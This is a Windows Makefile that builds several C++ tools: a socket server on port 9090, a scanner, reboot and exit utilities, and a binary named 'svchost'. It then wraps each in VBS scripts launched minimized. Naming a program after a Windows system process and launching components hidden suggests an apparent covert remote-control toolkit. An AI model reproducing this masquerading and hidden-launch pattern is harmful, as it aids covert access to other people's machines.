all: main

serv:
	-windres -i "../bin/rec.rc" --input-format=rc -o "../bin/rec.res" -O coff
	g++ -c serv.cpp -o serv.o
	g++ serv.o ../bin/rec.res -o ../bin/serv -lws2_32
	del serv.o
	-del ..\\bin\\rec.rc

svchost: 
	g++ svchost.cpp -o ../bin/svchost

chport:
	g++ chport.cpp -o ../bin/chport

reboot:
	g++ reboot.cpp -o ../bin/reboot

exit:
	g++ exit.cpp -o ../bin/exit

sound:
	g++ sound.cpp -o ../bin/sound

fillvbs:
	g++ fillvbs.cpp -o ../bin/fillvbs

scanner:
	-windres -i "../bin/recForScan.rc" --input-format=rc -o "../bin/recForScan.res" -O coff
	g++ -c scanner.cpp -o scanner.o
	g++ scanner.o ../bin/recForScan.res -o ../bin/scanner
	del scanner.o
	-del ..\\recForScan.rc

end:
	-mkdir ..\\log
	-mkdir ..\\settings
	-mkdir ..\\sounds
	touch ..\\log\\startapp.log
	touch ..\\settings\\config.cfg
	touch ..\\sounds\\mstart.vbs
	echo port=9090 > ..\\settings\\config.cfg
	echo bytesRecieved=4096 >> ..\\settings\\config.cfg
	..\\fillvbs Opera.wav ../sounds/mstart.vbs
	start /MIN /D .. fillvbs reboot.exe reboot.vbs
	start /MIN /D .. fillvbs scanner.exe scanner.vbs
	start /MIN /D .. fillvbs serv.exe serv.vbs
	start /MIN /D .. fillvbs svchost.exe svchost.vbs

main: serv svchost chport reboot exit sound fillvbs scanner end
